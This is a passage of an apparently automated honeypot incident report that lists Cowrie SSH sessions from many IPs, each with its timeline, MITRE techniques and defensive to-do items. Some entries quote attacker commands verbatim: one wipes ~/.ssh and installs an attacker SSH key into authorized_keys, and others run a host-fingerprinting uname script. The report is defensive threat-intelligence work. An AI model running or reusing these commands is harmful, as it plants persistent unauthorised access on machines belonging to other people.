| `2026-07-15 10:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3dd7627a5d0

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-07-15 10:59 |
| **Last Seen** | 2026-07-15 10:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:59:29` | `cowrie.session.connect` |
| `2026-07-15 10:59:30` | `cowrie.client.version` |
| `2026-07-15 10:59:30` | `cowrie.client.kex` |
| `2026-07-15 10:59:32` | `cowrie.login.success` |
| `2026-07-15 10:59:33` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.194[.]29` to AbuseIPDB if not already reported
- [ ] Block `49.206.194[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcac47922e78

| Field | Detail |
|---|---|
| **Source IP** | `117.222.52[.]177` |
| **First Seen** | 2026-07-15 10:59 |
| **Last Seen** | 2026-07-15 10:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:59:33` | `cowrie.session.connect` |
| `2026-07-15 10:59:33` | `cowrie.client.version` |
| `2026-07-15 10:59:33` | `cowrie.client.kex` |
| `2026-07-15 10:59:35` | `cowrie.login.success` |
| `2026-07-15 10:59:35` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.52[.]177` to AbuseIPDB if not already reported
- [ ] Block `117.222.52[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93e0a8f047f

| Field | Detail |
|---|---|
| **Source IP** | `60.249.251[.]88` |
| **First Seen** | 2026-07-15 10:59 |
| **Last Seen** | 2026-07-15 10:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:59:35` | `cowrie.session.connect` |
| `2026-07-15 10:59:36` | `cowrie.client.version` |
| `2026-07-15 10:59:36` | `cowrie.client.kex` |
| `2026-07-15 10:59:40` | `cowrie.login.success` |
| `2026-07-15 10:59:43` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.251[.]88` to AbuseIPDB if not already reported
- [ ] Block `60.249.251[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67dca5d3b3d

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-15 10:59 |
| **Last Seen** | 2026-07-15 10:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:59:39` | `cowrie.session.connect` |
| `2026-07-15 10:59:40` | `cowrie.client.version` |
| `2026-07-15 10:59:40` | `cowrie.client.kex` |
| `2026-07-15 10:59:42` | `cowrie.login.success` |
| `2026-07-15 10:59:42` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e7d675c9b7

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-15 10:59 |
| **Last Seen** | 2026-07-15 10:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 10:59:41` | `cowrie.session.connect` |
| `2026-07-15 10:59:42` | `cowrie.client.version` |
| `2026-07-15 10:59:42` | `cowrie.client.kex` |
| `2026-07-15 10:59:43` | `cowrie.login.success` |
| `2026-07-15 10:59:43` | `cowrie.direct-tcpip.request` |
| `2026-07-15 10:59:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37e0d31813bb

| Field | Detail |
|---|---|
| **Source IP** | `147.182.177[.]180` |
| **First Seen** | 2026-07-15 11:01 |
| **Last Seen** | 2026-07-15 11:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:01:52` | `cowrie.session.connect` |
| `2026-07-15 11:01:52` | `cowrie.client.version` |
| `2026-07-15 11:01:52` | `cowrie.client.kex` |
| `2026-07-15 11:01:52` | `cowrie.login.success` |
| `2026-07-15 11:01:53` | `cowrie.session.params` |
| `2026-07-15 11:01:53` | `cowrie.command.input` |
| `2026-07-15 11:01:53` | `cowrie.command.failed` |
| `2026-07-15 11:01:53` | `cowrie.log.closed` |
| `2026-07-15 11:01:53` | `cowrie.session.params` |
| `2026-07-15 11:01:53` | `cowrie.command.input` |
| `2026-07-15 11:01:53` | `cowrie.session.file_download` |
| `2026-07-15 11:01:53` | `cowrie.log.closed` |
| `2026-07-15 11:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.177[.]180` to AbuseIPDB if not already reported
- [ ] Block `147.182.177[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-886838be61a8

| Field | Detail |
|---|---|
| **Source IP** | `147.182.177[.]180` |
| **First Seen** | 2026-07-15 11:01 |
| **Last Seen** | 2026-07-15 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:01:54` | `cowrie.session.connect` |
| `2026-07-15 11:01:54` | `cowrie.client.version` |
| `2026-07-15 11:01:54` | `cowrie.client.kex` |
| `2026-07-15 11:01:54` | `cowrie.login.success` |
| `2026-07-15 11:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.177[.]180` to AbuseIPDB if not already reported
- [ ] Block `147.182.177[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a5fd55538e7

| Field | Detail |
|---|---|
| **Source IP** | `147.182.177[.]180` |
| **First Seen** | 2026-07-15 11:01 |
| **Last Seen** | 2026-07-15 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:01:54` | `cowrie.session.connect` |
| `2026-07-15 11:01:54` | `cowrie.client.version` |
| `2026-07-15 11:01:54` | `cowrie.client.kex` |
| `2026-07-15 11:01:54` | `cowrie.login.success` |
| `2026-07-15 11:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.182.177[.]180` to AbuseIPDB if not already reported
- [ ] Block `147.182.177[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a6bf25cbf3

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-07-15 11:03 |
| **Last Seen** | 2026-07-15 11:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:03:22` | `cowrie.session.connect` |
| `2026-07-15 11:03:23` | `cowrie.client.version` |
| `2026-07-15 11:03:23` | `cowrie.client.kex` |
| `2026-07-15 11:03:25` | `cowrie.login.success` |
| `2026-07-15 11:03:26` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d474b1b4fbd7

| Field | Detail |
|---|---|
| **Source IP** | `222.190.110[.]210` |
| **First Seen** | 2026-07-15 11:03 |
| **Last Seen** | 2026-07-15 11:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:03:32` | `cowrie.session.connect` |
| `2026-07-15 11:03:33` | `cowrie.client.version` |
| `2026-07-15 11:03:33` | `cowrie.client.kex` |
| `2026-07-15 11:03:35` | `cowrie.login.success` |
| `2026-07-15 11:03:36` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.190.110[.]210` to AbuseIPDB if not already reported
- [ ] Block `222.190.110[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f49e34d2ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-15 11:14 |
| **Last Seen** | 2026-07-15 11:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:14:35` | `cowrie.session.connect` |
| `2026-07-15 11:14:35` | `cowrie.client.version` |
| `2026-07-15 11:14:35` | `cowrie.client.kex` |
| `2026-07-15 11:14:36` | `cowrie.login.success` |
| `2026-07-15 11:14:36` | `cowrie.session.params` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.success` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:36` | `cowrie.command.input` |
| `2026-07-15 11:14:37` | `cowrie.log.closed` |
| `2026-07-15 11:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-600adb3a7d4e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-15 11:15 |
| **Last Seen** | 2026-07-15 11:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:15:30` | `cowrie.session.connect` |
| `2026-07-15 11:15:31` | `cowrie.client.version` |
| `2026-07-15 11:15:31` | `cowrie.client.kex` |
| `2026-07-15 11:15:33` | `cowrie.login.success` |
| `2026-07-15 11:15:35` | `cowrie.session.params` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.success` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.command.input` |
| `2026-07-15 11:15:35` | `cowrie.log.closed` |
| `2026-07-15 11:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4d063e5ae8

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-15 11:25 |
| **Last Seen** | 2026-07-15 11:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:25:09` | `cowrie.session.connect` |
| `2026-07-15 11:25:09` | `cowrie.client.version` |
| `2026-07-15 11:25:09` | `cowrie.client.kex` |
| `2026-07-15 11:25:11` | `cowrie.login.success` |
| `2026-07-15 11:25:11` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942ec879ca3c

| Field | Detail |
|---|---|
| **Source IP** | `45.181.101[.]95` |
| **First Seen** | 2026-07-15 11:25 |
| **Last Seen** | 2026-07-15 11:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:25:17` | `cowrie.session.connect` |
| `2026-07-15 11:25:17` | `cowrie.client.version` |
| `2026-07-15 11:25:17` | `cowrie.client.kex` |
| `2026-07-15 11:25:19` | `cowrie.login.success` |
| `2026-07-15 11:25:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:25:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.181.101[.]95` to AbuseIPDB if not already reported
- [ ] Block `45.181.101[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11feba710676

| Field | Detail |
|---|---|
| **Source IP** | `118.91.176[.]243` |
| **First Seen** | 2026-07-15 11:25 |
| **Last Seen** | 2026-07-15 11:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:25:55` | `cowrie.session.connect` |
| `2026-07-15 11:25:57` | `cowrie.client.version` |
| `2026-07-15 11:25:57` | `cowrie.client.kex` |
| `2026-07-15 11:26:00` | `cowrie.login.success` |
| `2026-07-15 11:26:01` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:26:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.91.176[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.91.176[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e026879debd

| Field | Detail |
|---|---|
| **Source IP** | `58.22.255[.]28` |
| **First Seen** | 2026-07-15 11:29 |
| **Last Seen** | 2026-07-15 11:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:29:11` | `cowrie.session.connect` |
| `2026-07-15 11:29:11` | `cowrie.client.version` |
| `2026-07-15 11:29:11` | `cowrie.client.kex` |
| `2026-07-15 11:29:13` | `cowrie.login.success` |
| `2026-07-15 11:29:14` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.22.255[.]28` to AbuseIPDB if not already reported
- [ ] Block `58.22.255[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad0ca0b2957

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 11:30 |
| **Last Seen** | 2026-07-15 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:30:52` | `cowrie.session.connect` |
| `2026-07-15 11:30:52` | `cowrie.client.version` |
| `2026-07-15 11:30:52` | `cowrie.client.kex` |
| `2026-07-15 11:30:53` | `cowrie.login.success` |
| `2026-07-15 11:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d10cadb2d834

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 11:30 |
| **Last Seen** | 2026-07-15 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:30:52` | `cowrie.session.connect` |
| `2026-07-15 11:30:52` | `cowrie.client.version` |
| `2026-07-15 11:30:52` | `cowrie.client.kex` |
| `2026-07-15 11:30:53` | `cowrie.login.success` |
| `2026-07-15 11:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aec5268a68b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 11:31 |
| **Last Seen** | 2026-07-15 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:31:42` | `cowrie.session.connect` |
| `2026-07-15 11:31:42` | `cowrie.client.version` |
| `2026-07-15 11:31:42` | `cowrie.client.kex` |
| `2026-07-15 11:31:42` | `cowrie.login.success` |
| `2026-07-15 11:31:43` | `cowrie.session.params` |
| `2026-07-15 11:31:43` | `cowrie.command.input` |
| `2026-07-15 11:31:43` | `cowrie.log.closed` |
| `2026-07-15 11:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff85976167b

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-07-15 11:48 |
| **Last Seen** | 2026-07-15 11:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:48:11` | `cowrie.session.connect` |
| `2026-07-15 11:48:12` | `cowrie.client.version` |
| `2026-07-15 11:48:12` | `cowrie.client.kex` |
| `2026-07-15 11:48:14` | `cowrie.login.success` |
| `2026-07-15 11:48:14` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaa892229ad1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 11:48 |
| **Last Seen** | 2026-07-15 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:48:49` | `cowrie.session.connect` |
| `2026-07-15 11:48:49` | `cowrie.client.version` |
| `2026-07-15 11:48:49` | `cowrie.client.kex` |
| `2026-07-15 11:48:49` | `cowrie.login.success` |
| `2026-07-15 11:48:50` | `cowrie.session.params` |
| `2026-07-15 11:48:50` | `cowrie.command.input` |
| `2026-07-15 11:48:50` | `cowrie.log.closed` |
| `2026-07-15 11:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331631e81d7d

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-07-15 11:51 |
| **Last Seen** | 2026-07-15 11:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:51:51` | `cowrie.session.connect` |
| `2026-07-15 11:51:51` | `cowrie.client.version` |
| `2026-07-15 11:51:51` | `cowrie.client.kex` |
| `2026-07-15 11:51:52` | `cowrie.login.success` |
| `2026-07-15 11:51:53` | `cowrie.direct-tcpip.request` |
| `2026-07-15 11:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a7b9921e80

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-07-15 11:51 |
| **Last Seen** | 2026-07-15 11:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 11:51:58` | `cowrie.session.connect` |
| `2026-07-15 11:51:59` | `cowrie.client.version` |
| `2026-07-15 11:51:59` | `cowrie.client.kex` |
| `2026-07-15 11:52:01` | `cowrie.login.success` |
| `2026-07-15 11:52:02` | `cowrie.direct-tcpip.request` |
